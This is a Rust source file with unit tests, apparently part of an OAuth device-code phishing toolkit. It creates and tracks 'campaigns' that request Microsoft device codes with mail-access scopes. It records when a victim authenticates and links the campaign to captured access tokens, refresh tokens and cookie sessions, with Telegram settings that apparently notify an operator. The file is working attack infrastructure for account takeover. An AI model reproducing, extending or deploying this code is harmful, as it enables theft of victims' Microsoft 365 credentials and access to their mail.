use crate::AppState;
use actix_web::{web, HttpResponse, Responder};
use anyhow::Context;
use chrono::{Duration, Utc};
use serde::{Deserialize, Serialize};
use sqlx::SqlitePool;

#[derive(Debug, Clone, sqlx::FromRow, Serialize, Deserialize)]
pub struct Campaign {
    pub id: String,
    pub name: String,
    pub client_id: String,
    pub requested_scopes: String,
    pub device_code: Option<String>,
    pub user_code: Option<String>,
    pub verification_uri: Option<String>,
    pub status: String,
    pub created_at: chrono::DateTime<Utc>,
    pub expires_at: chrono::DateTime<Utc>,
    pub token_id: Option<String>,
    #[sqlx(default)]
    pub token_email: Option<String>,
}

#[derive(Deserialize)]
pub struct CreateCampaignRequest {
    pub name: String,
    pub client_id: Option<String>,
    pub requested_scopes: Vec<String>,
    pub device_code: Option<String>,
    pub user_code: Option<String>,
    pub verification_uri: Option<String>,
    pub expires_in: Option<i64>,
}

#[derive(Serialize)]
pub struct CreateCampaignResponse {
    pub id: String,
    pub name: String,
    pub user_code: Option<String>,
    pub verification_uri: Option<String>,
    pub status: String,
    pub expires_at: chrono::DateTime<Utc>,
}

#[derive(Deserialize)]
pub struct AttachTokenRequest {
    pub token_id: String,
}

#[derive(Deserialize)]
pub struct CampaignListQuery {
    pub page: Option<i64>,
    pub per_page: Option<i64>,
    pub status: Option<String>,
    pub search: Option<String>,
}

#[derive(Serialize)]
pub struct CampaignListResponse {
    pub campaigns: Vec<Campaign>,
    pub total: usize,
    pub page: i64,
    pub per_page: i64,
}

async fn call_device_code_endpoint(
    http_client: &reqwest::Client,
    url: &str,
    client_id: &str,
    scopes: &[String],
) -> anyhow::Result<(String, String, String, i64)> {
    let scope_str = scopes.join(" ");
    let params = [("client_id", client_id), ("scope", &scope_str)];

    let res = http_client
        .post(url)
        .form(&params)
        .send()
        .await
        .context("Device code request failed")?;

    if !res.status().is_success() {
        let body = res.text().await.unwrap_or_default();
        anyhow::bail!("Device code endpoint returned error: {}", body);
    }

    let body: serde_json::Value = res
        .json()
        .await
        .context("Failed to parse device code response")?;

    let device_code = body
        .get("device_code")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let user_code = body
        .get("user_code")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let verification_uri = body
        .get("verification_uri")
        .and_then(|v| v.as_str())
        .unwrap_or("https://microsoft.com/devicelogin")
        .to_string();
    let expires_in = body
        .get("expires_in")
        .and_then(|v| v.as_i64())
        .unwrap_or(900);

    Ok((device_code, user_code, verification_uri, expires_in))
}

pub async fn create_campaign(
    pool: &SqlitePool,
    http_client: &reqwest::Client,
    config: &crate::AppConfig,
    req: &CreateCampaignRequest,
) -> anyhow::Result<Campaign> {
    let id = uuid::Uuid::new_v4().to_string();
    let now = Utc::now();

    let (device_code, user_code, verification_uri, expires_in) =
        if let (Some(dc), Some(uc), Some(vu)) = (
            &req.device_code,
            &req.user_code,
            &req.verification_uri,
        ) {
            (
                dc.clone(),
                uc.clone(),
                vu.clone(),
                req.expires_in.unwrap_or(900),
            )
        } else {
            let client_id = req.client_id.as_ref().unwrap_or(&config.client_id);
            call_device_code_endpoint(
                http_client,
                "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                client_id,
                &req.requested_scopes,
            )
            .await?
        };

    let expires_at = now + Duration::seconds(expires_in);
    let scopes_json = serde_json::to_string(&req.requested_scopes).unwrap_or_else(|_| "[]".to_string());
    let client_id = req.client_id.as_ref().unwrap_or(&config.client_id).clone();

    sqlx::query(
        r#"
        INSERT INTO campaigns (
            id, name, client_id, requested_scopes, device_code, user_code,
            verification_uri, status, created_at, expires_at, token_id
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        "#,
    )
    .bind(&id)
    .bind(&req.name)
    .bind(&client_id)
    .bind(&scopes_json)
    .bind(&device_code)
    .bind(&user_code)
    .bind(&verification_uri)
    .bind("pending")
    .bind(now)
    .bind(expires_at)
    .bind(Option::<String>::None)
    .execute(pool)
    .await
    .context("Failed to insert campaign")?;

    Ok(Campaign {
        id,
        name: req.name.clone(),
        client_id,
        requested_scopes: scopes_json,
        device_code: Some(device_code),
        user_code: Some(user_code),
        verification_uri: Some(verification_uri),
        status: "pending".to_string(),
        created_at: now,
        expires_at,
        token_id: None,
        token_email: None,
    })
}

pub async fn list_campaigns(
    pool: &SqlitePool,
    query: &CampaignListQuery,
) -> anyhow::Result<CampaignListResponse> {
    let page = query.page.unwrap_or(1).max(1);
    let per_page = query.per_page.unwrap_or(20).clamp(1, 100);
    let offset = (page - 1) * per_page;

    let rows = sqlx::query_as::<_, Campaign>(
        r#"
        SELECT
            c.id, c.name, c.client_id, c.requested_scopes,
            c.device_code, c.user_code, c.verification_uri,
            c.status, c.created_at, c.expires_at, c.token_id,
            t.user_email as token_email
        FROM campaigns c
        LEFT JOIN tokens t ON c.token_id = t.id
        ORDER BY c.created_at DESC
        "#,
    )
    .fetch_all(pool)
    .await
    .context("Failed to fetch campaigns")?;

    let filtered: Vec<Campaign> = rows
        .into_iter()
        .filter(|c| {
            if let Some(status) = &query.status {
                if status == "active" {
                    c.status == "pending" || c.status == "authenticated"
                } else {
                    &c.status == status
                }
            } else {
                true
            }
        })
        .filter(|c| {
            if let Some(search) = &query.search {
                let s = search.to_lowercase();
                c.name.to_lowercase().contains(&s)
                    || c.token_email
                        .as_ref()
                        .map(|e| e.to_lowercase().contains(&s))
                        .unwrap_or(false)
                    || c.client_id.to_lowercase().contains(&s)
            } else {
                true
            }
        })
        .collect();

    let total = filtered.len();

    let campaigns: Vec<Campaign> = filtered
        .into_iter()
        .skip(offset as usize)
        .take(per_page as usize)
        .collect();

    Ok(CampaignListResponse {
        campaigns,
        total,
        page,
        per_page,
    })
}

pub async fn get_campaign(pool: &SqlitePool, id: &str) -> anyhow::Result<Option<Campaign>> {
    let campaign: Option<Campaign> = sqlx::query_as(
        r#"
        SELECT
            c.id, c.name, c.client_id, c.requested_scopes,
            c.device_code, c.user_code, c.verification_uri,
            c.status, c.created_at, c.expires_at, c.token_id,
            t.user_email as token_email
        FROM campaigns c
        LEFT JOIN tokens t ON c.token_id = t.id
        WHERE c.id = ?
        "#,
    )
    .bind(id)
    .fetch_optional(pool)
    .await
    .context("Failed to fetch campaign")?;

    Ok(campaign)
}

pub async fn attach_token(
    pool: &SqlitePool,
    campaign_id: &str,
    token_id: &str,
) -> anyhow::Result<()> {
    sqlx::query(
        "UPDATE campaigns SET status = 'authenticated', token_id = ? WHERE id = ?",
    )
    .bind(token_id)
    .bind(campaign_id)
    .execute(pool)
    .await
    .context("Failed to attach token to campaign")?;

    Ok(())
}

pub async fn delete_campaign(
    pool: &SqlitePool,
    _http_client: &reqwest::Client,
    _config: &crate::AppConfig,
    id: &str,
) -> anyhow::Result<()> {
    sqlx::query("DELETE FROM campaigns WHERE id = ?")
        .bind(id)
        .execute(pool)
        .await
        .context("Failed to delete campaign")?;

    Ok(())
}

// === HTTP Handlers ===

pub async fn create_campaign_handler(
    body: web::Json<CreateCampaignRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    match create_campaign(&state.pool, &state.http_client, &state.config, &body).await {
        Ok(campaign) => HttpResponse::Ok().json(CreateCampaignResponse {
            id: campaign.id,
            name: campaign.name,
            user_code: campaign.user_code,
            verification_uri: campaign.verification_uri,
            status: campaign.status,
            expires_at: campaign.expires_at,
        }),
        Err(e) => {
            eprintln!("[campaigns] Create failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "campaign_creation_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn list_campaigns_handler(
    query: web::Query<CampaignListQuery>,
    state: web::Data<AppState>,
) -> impl Responder {
    match list_campaigns(&state.pool, &query).await {
        Ok(response) => HttpResponse::Ok().json(response),
        Err(e) => {
            eprintln!("[campaigns] List failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "campaign_list_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn get_campaign_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match get_campaign(&state.pool, &id).await {
        Ok(Some(campaign)) => HttpResponse::Ok().json(campaign),
        Ok(None) => HttpResponse::NotFound().json(serde_json::json!({
            "error": "campaign_not_found"
        })),
        Err(e) => {
            eprintln!("[campaigns] Get failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "campaign_get_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn attach_token_handler(
    path: web::Path<String>,
    body: web::Json<AttachTokenRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match attach_token(&state.pool, &id, &body.token_id).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
            "status": "token_attached",
            "campaign_id": id,
            "token_id": body.token_id
        })),
        Err(e) => {
            eprintln!("[campaigns] Attach token failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "attach_token_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn delete_campaign_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match delete_campaign(&state.pool, &state.http_client, &state.config, &id).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
            "status": "revoked",
            "campaign_id": id
        })),
        Err(e) => {
            eprintln!("[campaigns] Delete failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "campaign_delete_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AppConfig;
    use sqlx::sqlite::SqlitePoolOptions;
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    async fn setup_test_state() -> AppState {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active',
                account_type TEXT,
                cookie_session TEXT
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                client_id TEXT NOT NULL,
                requested_scopes TEXT,
                device_code TEXT,
                user_code TEXT,
                verification_uri TEXT,
                status TEXT NOT NULL,
                created_at DATETIME NOT NULL,
                expires_at DATETIME NOT NULL,
                token_id TEXT
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        let config = AppConfig {
            client_id: "test_client_id".to_string(),
            client_secret: "test_secret".to_string(),
            redirect_uri: "http://localhost".to_string(),
            first_party_ids: vec![],
            database_url: "sqlite::memory:".to_string(),
            telegram_bot_token: None,
            telegram_chat_id: None,
            master_secret: "test_campaign_secret".to_string(),
            frontend_url: None,
        };

        let vault = crate::vault::Vault::new(config.master_secret.clone());
        let http_client = reqwest::Client::new();

        let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);

        AppState {
            pool,
            config,
            http_client,
            vault,
            response_key,
        }
    }

    #[tokio::test]
    async fn test_create_campaign_with_pre_generated() {
        let state = setup_test_state().await;

        let req = CreateCampaignRequest {
            name: "Test Campaign".to_string(),
            client_id: Some("custom_client".to_string()),
            requested_scopes: vec!["Mail.ReadWrite".to_string()],
            device_code: Some("device123".to_string()),
            user_code: Some("USER123".to_string()),
            verification_uri: Some("https://microsoft.com/devicelogin".to_string()),
            expires_in: Some(900),
        };

        let campaign = create_campaign(&state.pool, &state.http_client, &state.config, &req)
            .await
            .expect("Campaign creation should succeed");

        assert_eq!(campaign.name, "Test Campaign");
        assert_eq!(campaign.status, "pending");
        assert_eq!(campaign.device_code, Some("device123".to_string()));
        assert_eq!(campaign.user_code, Some("USER123".to_string()));
    }

    #[tokio::test]
    async fn test_create_campaign_via_device_endpoint() {
        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/common/oauth2/v2.0/devicecode"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "device_code": "mock-device-456",
                "user_code": "MOCK456",
                "verification_uri": "https://microsoft.com/devicelogin",
                "expires_in": 900,
                "interval": 5,
                "message": "To sign in, use a web browser..."
            })))
            .mount(&mock_server)
            .await;

        let result = call_device_code_endpoint(
            &reqwest::Client::new(),
            &format!("{}/common/oauth2/v2.0/devicecode", mock_server.uri()),
            "test_client",
            &["User.Read".to_string()],
        )
        .await
        .expect("Device code endpoint call should succeed");

        assert_eq!(result.0, "mock-device-456");
        assert_eq!(result.1, "MOCK456");
        assert_eq!(result.2, "https://microsoft.com/devicelogin");
        assert_eq!(result.3, 900);
    }

    #[tokio::test]
    async fn test_list_and_filter_campaigns() {
        let state = setup_test_state().await;

        for i in 0..5 {
            let req = CreateCampaignRequest {
                name: format!("Campaign {}", i),
                client_id: None,
                requested_scopes: vec!["Mail.ReadWrite".to_string()],
                device_code: Some(format!("dev{}", i)),
                user_code: Some(format!("CODE{}", i)),
                verification_uri: Some("https://microsoft.com/devicelogin".to_string()),
                expires_in: Some(900),
            };
            create_campaign(&state.pool, &state.http_client, &state.config, &req)
                .await
                .unwrap();
        }

        let rows: Vec<(String,)> =
            sqlx::query_as("SELECT id FROM campaigns ORDER BY created_at DESC LIMIT 1")
                .fetch_all(&state.pool)
                .await
                .unwrap();
        let last_id = &rows[0].0;
        attach_token(&state.pool, last_id, "fake-token-id")
            .await
            .unwrap();

        let query = CampaignListQuery {
            page: Some(1),
            per_page: Some(10),
            status: Some("active".to_string()),
            search: None,
        };

        let result = list_campaigns(&state.pool, &query).await.unwrap();
        assert_eq!(result.total, 5);
        assert_eq!(result.campaigns.len(), 5);

        let query_pending = CampaignListQuery {
            page: Some(1),
            per_page: Some(10),
            status: Some("pending".to_string()),
            search: None,
        };
        let result_pending = list_campaigns(&state.pool, &query_pending).await.unwrap();
        assert_eq!(result_pending.total, 4);
    }

    #[tokio::test]
    async fn test_get_campaign() {
        let state = setup_test_state().await;

        let req = CreateCampaignRequest {
            name: "Get Me".to_string(),
            client_id: None,
            requested_scopes: vec!["User.Read".to_string()],
            device_code: Some("dev999".to_string()),
            user_code: Some("CODE999".to_string()),
            verification_uri: Some("https://microsoft.com/devicelogin".to_string()),
            expires_in: Some(900),
        };
        let campaign = create_campaign(&state.pool, &state.http_client, &state.config, &req)
            .await
            .unwrap();

        let fetched = get_campaign(&state.pool, &campaign.id).await.unwrap();
        assert!(fetched.is_some());
        assert_eq!(fetched.unwrap().name, "Get Me");
    }

    #[tokio::test]
    async fn test_delete_campaign() {
        let state = setup_test_state().await;

        let req = CreateCampaignRequest {
            name: "Delete Me".to_string(),
            client_id: None,
            requested_scopes: vec!["User.Read".to_string()],
            device_code: Some("dev-del".to_string()),
            user_code: Some("CODEDEL".to_string()),
            verification_uri: Some("https://microsoft.com/devicelogin".to_string()),
            expires_in: Some(900),
        };
        let campaign = create_campaign(&state.pool, &state.http_client, &state.config, &req)
            .await
            .unwrap();

        delete_campaign(&state.pool, &state.http_client, &state.config, &campaign.id)
            .await
            .unwrap();

        let fetched = get_campaign(&state.pool, &campaign.id).await.unwrap();
        assert!(fetched.is_none(), "Campaign should be permanently deleted");
    }
}
